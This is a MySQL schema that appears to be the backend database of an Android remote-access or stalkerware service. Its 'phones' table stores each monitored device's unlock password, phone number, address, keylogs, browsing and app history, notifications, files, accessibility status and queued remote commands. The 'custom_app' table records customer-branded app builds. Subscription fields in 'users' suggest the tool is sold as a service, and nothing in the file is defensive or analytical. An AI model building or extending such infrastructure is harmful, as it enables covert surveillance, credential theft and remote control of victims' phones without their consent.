DROP TABLE IF EXISTS phones;
DROP TABLE IF EXISTS custom_app;
DROP TABLE IF EXISTS store;
DROP TABLE IF EXISTS error_logs;
DROP TABLE IF EXISTS login_logs;
DROP TABLE IF EXISTS admin_action_logs;
DROP TABLE IF EXISTS admins;
DROP TABLE IF EXISTS users;

CREATE TABLE admins (
  id INT NOT NULL AUTO_INCREMENT,
  username VARCHAR(50) NOT NULL,
  password VARCHAR(255) NOT NULL,
  created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  UNIQUE (username)
);

CREATE TABLE users (
  userid INT NOT NULL AUTO_INCREMENT,
  usrname VARCHAR(16),
  profilepic TEXT NOT NULL,
  email VARCHAR(255) NOT NULL,
  password TEXT NOT NULL,
  otp_salt TEXT,
  Expire DATE,
  subtype VARCHAR(20),
  token TEXT,
  token_expiration TIMESTAMP,
  authorty VARCHAR(20) NOT NULL,
  contact VARCHAR(255),
  hidden TINYINT DEFAULT 0,
  admin_remark TEXT,
  admin_token TEXT,
  admin_token_expiration TIMESTAMP,
  PRIMARY KEY (userid)
);

CREATE TABLE phones (
  phone_id VARCHAR(255) NOT NULL,
  usrname VARCHAR(50) NOT NULL,
  phone_name VARCHAR(50) NOT NULL,
  country TEXT NOT NULL,
  address TEXT NOT NULL,
  android_ver TEXT NOT NULL,
  model TEXT NOT NULL,
  phonepassword TEXT NOT NULL,
  phonenumber TEXT NOT NULL,
  wallpaper LONGTEXT,
  battery_charg TEXT NOT NULL,
  network TEXT NOT NULL,
  install_date TEXT NOT NULL,
  last_ping TIMESTAMP NOT NULL,
  files_path TEXT,
  files_data TEXT,
  mob_permissions TEXT,
  keylogs_dates TEXT NOT NULL,
  visited_links TEXT NOT NULL,
  visited_apps TEXT NOT NULL,
  notifications TEXT NOT NULL,
  activities TEXT NOT NULL,
  phone_options TEXT NOT NULL,
  session_id VARCHAR(255) NOT NULL DEFAULT 'empty',
  Commands TEXT,
  isonline TINYINT NOT NULL DEFAULT 0,
  isRemoved TINYINT NOT NULL DEFAULT 0,
  phoneopen TINYINT NOT NULL DEFAULT 1,
  accessibility VARCHAR(10) DEFAULT '0',
  PRIMARY KEY (phone_id)
);

CREATE TABLE custom_app (
  build_id INT NOT NULL AUTO_INCREMENT,
  user_id INT,
  app_package VARCHAR(255),
  app_path VARCHAR(255),
  appname VARCHAR(18) NOT NULL,
  app_ico VARCHAR(255),
  build_date VARCHAR(50) NOT NULL,
  build_state VARCHAR(20),
  PRIMARY KEY (build_id)
);

CREATE TABLE store (
  app_id VARCHAR(255) NOT NULL,
  app_name VARCHAR(255),
  app_folder VARCHAR(255),
  main_activity VARCHAR(255),
  app_ico VARCHAR(255),
  PRIMARY KEY (app_id)
);

CREATE TABLE error_logs (
  id BIGINT NOT NULL AUTO_INCREMENT,
  phone_id VARCHAR(255),
  devicename VARCHAR(128),
  ip VARCHAR(64),
  log TEXT,
  created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id)
);

CREATE TABLE login_logs (
  id BIGINT NOT NULL AUTO_INCREMENT,
  username VARCHAR(64),
  success TINYINT NOT NULL,
  ip VARCHAR(64),
  user_agent VARCHAR(255),
  reason VARCHAR(128),
  created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id)
);

CREATE TABLE admin_action_logs (
  id BIGINT NOT NULL AUTO_INCREMENT,
  admin_username VARCHAR(64),
  action VARCHAR(64),
  target VARCHAR(255),
  payload_json TEXT,
  ip VARCHAR(64),
  created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id)
);
